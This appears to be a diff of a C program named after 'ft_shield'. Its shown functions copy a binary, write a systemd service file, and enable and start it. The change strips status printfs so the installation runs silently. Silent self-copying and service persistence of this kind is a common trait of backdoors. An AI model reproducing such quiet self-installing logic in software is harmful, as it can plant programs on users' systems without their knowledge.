@@ -1,4 +1,3 @@
-
 #include "ft_shield.h"
 
 void copy_binary_f(const char *sourcePath, const char *destinationPath) {
@@ -57,8 +56,6 @@ void enable_and_start_s(const char* service_name)
         perror("Failed to start systemd service");
         exit(EXIT_FAILURE);
     }
-
-    // printf("Service enabled and started: %s\n", service_name);
 }
 
 void create_service(const char* service_name, const char* binary_path) 
@@ -97,8 +94,6 @@ void create_service(const char* service_name, const char* binary_path)
 
     fclose(file);
 
-    // printf("Service file created: %s\n", service_file_path);
     enable_and_start_s(SERVICE_NAME);
-    printf(LOGIN"\n");
     exit(EXIT_SUCCESS);
 }
